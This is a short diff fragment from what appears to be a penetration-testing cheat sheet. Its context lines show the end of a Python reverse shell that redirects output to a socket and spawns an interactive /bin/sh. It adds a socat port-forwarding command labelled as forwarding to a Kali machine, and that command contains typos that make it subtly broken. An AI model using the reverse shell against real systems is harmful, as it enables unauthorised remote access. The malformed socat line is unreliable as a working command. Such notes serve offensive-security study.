@@ -392,3 +392,6 @@ os.dup2(s.fileno(),1)
 os.dup2(s.fileno(),2)
 p = subprocess.call(["/bin/sh","-i"])
 
+Local port forwarding using socat on linux:
+socat tcp:listen:7000,reuseaddr, fork tcp:locatlhost:8080 #forwards local port 8080 to kali's port 7000
+
